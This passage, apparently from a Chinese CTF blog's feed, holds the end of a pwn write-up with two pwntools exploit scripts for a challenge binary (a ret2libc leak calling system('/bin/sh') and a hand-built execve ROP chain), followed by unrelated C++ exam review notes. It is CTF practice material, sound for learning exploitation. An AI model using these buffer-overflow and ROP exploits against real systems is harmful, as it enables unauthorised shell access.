class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn4&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="comment"># io=process(&#x27;./pwn4&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28378</span>)</span><br><span class="line">pop_rdi_ret=<span class="number">0x0000004007d3</span></span><br><span class="line">buf=<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x67</span></span><br><span class="line">pal1=p64(pop_rdi_ret)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">io.recvuntil(<span class="string">&quot;Leave your message:\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.send(buf+pal1)</span><br><span class="line">data=io.recvuntil(<span class="string">&#x27;Ok,Message Received\n&#x27;</span>)</span><br><span class="line">puts_addr=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base=puts_addr-<span class="number">0x84420</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">p=buf+p64(<span class="number">0x0000000000400556</span>)+p64(pop_rdi_ret)+p64(binsh)+p64(system)</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Leave your message:\n&quot;</span>)</span><br><span class="line">io.send(p)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn4&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="comment"># io=process(&#x27;./pwn4&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28955</span>)</span><br><span class="line">pop_rdi_ret=<span class="number">0x4007d3</span></span><br><span class="line">buf=<span class="string">b&#x27;\x00&#x27;</span>+<span class="string">b&#x27;A&#x27;</span>*<span class="number">0x67</span></span><br><span class="line">pal1=p64(pop_rdi_ret)+p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p64(elf.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">io.recvuntil(<span class="string">&quot;Leave your message:\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.send(buf+pal1)</span><br><span class="line">data=io.recvuntil(<span class="string">&#x27;Ok,Message Received\n&#x27;</span>)</span><br><span class="line">puts_addr=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc_base=puts_addr-<span class="number">0x84420</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base+<span class="number">0x000002284d</span>))</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">ret=p64(<span class="number">0x0400556</span>)</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">p=buf+ret+ret</span><br><span class="line"><span class="comment"># p+=p64(pop_rdi_ret)+p64(binsh)+p64(system)</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x0000142c92</span>) <span class="comment"># pop rdx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00001ec1a0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x0000036174</span>) <span class="comment"># pop rax ; ret</span></span><br><span class="line">p += <span class="string">b&#x27;/bin//sh&#x27;</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x0000034550</span>) <span class="comment"># mov qword ptr [rdx], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x0000142c92</span>) <span class="comment"># pop rdx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00001ec1a8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000b1d69</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x0000034550</span>) <span class="comment"># mov qword ptr [rdx], rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x0000023b6a</span>) <span class="comment"># pop rdi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00001ec1a0</span>) <span class="comment"># @ .data</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x000002601f</span>) <span class="comment"># pop rsi ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00001ec1a8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x0000142c92</span>) <span class="comment"># pop rdx ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00001ec1a8</span>) <span class="comment"># @ .data + 8</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000b1d69</span>) <span class="comment"># xor rax, rax ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfb00</span>) <span class="comment"># add rax, 3 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x00000000000cfae7</span>) <span class="comment"># add rax, 2 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, libc_base+<span class="number">0x000002284d</span>) <span class="comment"># syscall</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(p))</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Leave your message:\n&quot;</span>)</span><br><span class="line">io.send(p)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>因为他的字符是0x200限制的因此要缩短一下（不是pop rax用不起，而是add更有feeling（bushi</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;刷题记录1&quot;&gt;&lt;a href=&quot;#刷题记录1&quot; class=&quot;headerlink&quot; title=&quot;刷题记录1&quot;&gt;&lt;/a&gt;刷题记录1&lt;/h1&gt;&lt;p&gt;因为国赛将近，开始每天几道题，难度不等，之后会有patch的使用（算是预告和DIR-815的复现（早就复现一直没时间</summary>
      
    
    
    
    <category term="做题记录" scheme="http://s1nec-1o.github.io/categories/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="traditional pwn" scheme="http://s1nec-1o.github.io/tags/traditional-pwn/"/>
    
  </entry>
  
  <entry>
    <title>C + +那年那些事</title>
    <link href="http://s1nec-1o.github.io/2024/05/10/C-%E9%82%A3%E5%B9%B4%E9%82%A3%E4%BA%9B%E4%BA%8B/"/>
    <id>http://s1nec-1o.github.io/2024/05/10/C-%E9%82%A3%E5%B9%B4%E9%82%A3%E4%BA%9B%E4%BA%8B/</id>
    <published>2024-05-10T13:17:14.000Z</published>
    <updated>2024-05-11T07:38:33.272Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本篇blog是读者所总结（cv大法均有包含出处，笔者水平有限，如果错误请指出（主要期末考总结了一下方便考前再次复习</p><h2 id="理论基础"><a href="#理论基础" class="headerlink" title="理论基础"></a>理论基础</h2><p>在protected保护继承中，对于垂直访问等同于公有继承，对于水平访问等同于私有继承。</p><p>动态绑定是在运行时选定调用的成员函数的。</p><p>对于从基类继承的虚函数，派生类也可以不进行重定义。</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405101909241.png" alt="image-20240509235749075" style="zoom:50%;" /><p>类A是类B的友元，说明类A是友元类</p><p>友元不能传递也不能继承：破坏封装性</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ClassB</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ClassA</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">display</span><span class="params">(<span class="type">const</span> ClassB&amp; b)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ClassB</span> &#123;</span><br><span class="line">    <span class="keyword">friend</span> <span class="keyword">class</span> <span class="title class_">ClassA</span>;  <span class="comment">// 声明ClassA为友元类</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> privateData = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="type">int</span> protectedData = <span class="number">20</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ClassA::display</span><span class="params">(<span class="type">const</span> ClassB&amp; b)</span> </span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Private Data: &quot;</span> &lt;&lt; b.privateData &lt;&lt; std::endl;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Protected Data: &quot;</span> &lt;&lt; b.protectedData &lt;&lt; std::endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在销毁派生类对象时，先调用基类的析构函数，再调用派生类的析构函数</p><h3 id="new"><a href="#new" class="headerlink" title="new"></a>new</h3><p><code>new</code>出来的对象仅仅是调用对象的构造函数，new之后要显示的调用delete函数</p><p><code>palcement new</code>的主要用途就是反复使用一块较大的动态分配的内存来构造不同类型的对象或者他们的数组。placement new构造起来的对象或其数组，要显示的调用他们的<a href="https://so.csdn.net/so/search?q=%E6%9E%90%E6%9E%84%E5%87%BD%E6%95%B0&spm=1001.2101.3001.7020">析构函数</a>来销毁，千万不要使用delete。</p><p>static修饰的对象时，只有在程序结束时才会调用析构函数，位于main函数中定义的对象之后</p><h3 id="友元"><a href="#友元" class="headerlink" title="友元"></a>友元</h3><p>友元的关键字为  <code>friend</code><br>友元的三种实现</p><ol><li>类做友元</li><li>成员函数做友元</li><li>全局函数做友元</li></ol><ul><li><p>friend修饰别的类</p><ul><li><p>友元类可以声明在类中任意位置。<code>friend class 类名</code></p></li><li><p>声明友元类之后，友元类中的所有成员函数都是该类的友元函数，能够访问该类的所有成员。</p></li></ul></li><li><p>friend修饰成员函数</p><ul><li><p>友元成员函数声明语法：<code>friend 函数返回值类型 类名::函数名();</code></p></li><li><p>注意定义的先后，建议在前面进行声明，后面进行函数的同一定义，防止出现问题。</p></li></ul></li><li><p>friend修饰类外定义的函数</p><ul><li><p>将类外部的普通函数作为类的友元函数，在类中使用friend关键字声明该普通函数就可以实现，友元函数可以在类中任意位置声明。</p></li><li><p>普通函数作为友元函数的声明形式如下所示： <code>friend 函数返回值类型 友元函数名（形参列表）</code></p></li></ul></li></ul><h3 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h3><p>链表确实是一种重要的动态数据结构，它在许多情况下非常有用，但您的描述中有几点需要澄清和修正：</p><ol><li><strong>动态内存分配</strong>： 链表确实根据需要动态地开辟内存空间。每个新元素（通常称为节点）都是在需要时创建的，这使得链表在内存使用方面非常灵活。</li><li><strong>插入和删除的灵活性</strong>： 链表可以在几乎任何位置轻松地插入或删除节点。由于不需要像数组那样移动元素，这些操作通常很高效，尤其是当你可以直接访问到要操作的节点的前一个节点时。</li><li><strong>不支持随机访问</strong>： 链表<strong>不支持随机访问</strong>。数组支持高效的随机访问，即可以直接通过索引在常数时间内访问任何元素。而链表则需要从头开始遍历，直到到达所需的元素，这使得访问特定元素是线性时间的操作。</li><li><strong>内存和操作效率</strong>：<ul><li><strong>内存使用</strong>：相比于数组，链表的内存使用通常更高，因为每个节点不仅要存储数据，还需要存储至少一个指向列表中下一个节点的指针。在双向链表中，还需要存储指向前一个节点的指针。</li><li><strong>操作效率</strong>：链表的操作效率依赖于具体操作。对于在链表头部或已知位置插入和删除操作，链表非常高效。然而，对于需要搜索特定元素的操作，链表的效率通常低于数组，因为需要遍历链表元素。</li></ul></li><li><strong>节省内存</strong>： 链表不一定能节省内存，特别是当节点包含的数据较小时，额外的指针所需的内存可能会使得链表的总内存占用实际上高于同等数量的数组元素。</li></ol><h3 id="运算符重载"><a href="#运算符重载" class="headerlink" title="运算符重载"></a>运算符重载</h3><p>在C++中，大多数运算符可以被重载为成员函数或非成员函数（包括友元函数），但并非所有运算符都可以用这三种方式重载。以下是一些关键点和例外：</p><h3 id="成员函数和非成员函数"><a href="#成员函数和非成员函数" class="headerlink" title="成员函数和非成员函数"></a>成员函数和非成员函数</h3><ul><li><strong>成员函数</strong>：当一个运算符被重载为成员函数时，它的第一个操作数必须是调用该成员函数的对象本身。这意味着，对于二元运算符，左操作数是对象本身，右操作数是作为参数传递的。</li><li><strong>非成员函数</strong>：这些通常被实现为普通函数或友元函数。友元函数虽然定义在类的外部，但它可以访问类的所有私有和保护成员。</li></ul><h3 id="友元函数"><a href="#友元函数" class="headerlink" title="友元函数"></a>友元函数</h3><ul><li><strong>友元函数</strong>：不是类的成员，但有权访问类的私有和保护成员。友元函数通常用于那些需要访问两个不同类对象的私有数据的运算符重载。</li></ul><h3 id="特殊运算符重载"><a href="#特殊运算符重载" class="headerlink" title="特殊运算符重载"></a>特殊运算符重载</h3><ul><li><strong>赋值运算符（<code>=</code>）</strong>：只能作为成员函数重载。这是因为赋值运算符需要改变对象自身的状态，且左侧操作数必须是类类型的对象。</li><li><strong>下标运算符（<code>[]</code>）</strong>、<strong>函数调用运算符（<code>()</code>）</strong>和<strong>箭头运算符（<code>-&gt;</code>）</strong>：也只能作为成员函数重载。</li><li><strong>递增（<code>++</code>）</strong>和<strong>递减（<code>--</code>）运算符</strong>：可以作为成员函数或非成员函数重载，但通常作为成员函数重载，以便可以直接修改对象的状态。</li></ul><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>举个例子，考虑一个简单的类<code>Vector</code>，我们可以重载加法运算符<code>+</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Vector</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="type">int</span> x, y;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 成员函数重载</span></span><br><span class="line">    Vector <span class="keyword">operator</span>+(<span class="type">const</span> Vector&amp; other) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;x + other.x, y + other.y&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 友元函数重载</span></span><br><span class="line">    <span class="keyword">friend</span> Vector <span class="keyword">operator</span>+(<span class="type">const</span> Vector&amp; lhs, <span class="type">const</span> Vector&amp; rhs) &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;lhs.x + rhs.x, lhs.y + rhs.y&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>在这个例子中，加法运算符可以作为成员函数或非成员友元函数重载。选择哪种方式取决于具体需求，例如，如果需要访问两个不同对象的私有成员，则可能需要使用友元函数。</p><h3 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h3><p>虽然很多运算符可以以不同方式重载，但并非所有运算符都可以通过所有三种方式（成员、非成员、友元）重载。选择合适的重载方式取决于特定的需求和设计目标。</p><h2 id="实践实例"><a href="#实践实例" class="headerlink" title="实践实例"></a>实践实例</h2><h3 id="vector使用"><a href="#vector使用" class="headerlink" title="vector使用"></a>vector使用</h3><p>下面是一些<code>vector</code>的用法示例：</p><p>**创建和初始化<code>vector</code>**：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 创建一个空的vector</span></span><br><span class="line">    std::vector&lt;<span class="type">int</span>&gt; numbers;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建一个具有初始值的vector</span></span><br><span class="line">    std::vector&lt;<span class="type">int</span>&gt; numbers = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用push_back()逐个添加元素</span></span><br><span class="line">    std::vector&lt;<span class="type">int</span>&gt; numbers;</span><br><span class="line">    numbers.<span class="built_in">push_back</span>(<span class="number">1</span>);</span><br><span class="line">    numbers.<span class="built_in">push_back</span>(<span class="number">2</span>);</span><br><span class="line">    numbers.<span class="built_in">push_back</span>(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用指定大小和初始值创建vector</span></span><br><span class="line">    <span class="function">std::vector&lt;<span class="type">int</span>&gt; <span class="title">numbers</span><span class="params">(<span class="number">5</span>, <span class="number">0</span>)</span></span>;  <span class="comment">// 包含5个初始值为0的元素</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>访问和修改<code>vector</code>中的元素</strong>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::vector&lt;<span class="type">int</span>&gt; numbers = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 通过下标访问元素</span></span><br><span class="line">    std::cout &lt;&lt; numbers[<span class="number">0</span>] &lt;&lt; std::endl;  <span class="comment">// 输出：1</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用at()函数访问元素（提供边界检查）</span></span><br><span class="line">    std::cout &lt;&lt; numbers.<span class="built_in">at</span>(<span class="number">2</span>) &lt;&lt; std::endl;  <span class="comment">// 输出：3</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改元素的值</span></span><br><span class="line">    numbers[<span class="number">3</span>] = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>获取<code>vector</code>的大小和迭代访问</strong>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::vector&lt;<span class="type">int</span>&gt; numbers = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取vector的大小</span></span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Size: &quot;</span> &lt;&lt; numbers.<span class="built_in">size</span>() &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用迭代器遍历vector</span></span><br><span class="line">    <span class="keyword">for</span> (std::vector&lt;<span class="type">int</span>&gt;::iterator it = numbers.<span class="built_in">begin</span>(); it != numbers.<span class="built_in">end</span>(); ++it) &#123;</span><br><span class="line">        std::cout &lt;&lt; *it &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    std::cout &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 使用范围-based for循环遍历vector（C++11及以上版本）</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> num : numbers) &#123;</span><br><span class="line">        std::cout &lt;&lt; num &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    std::cout 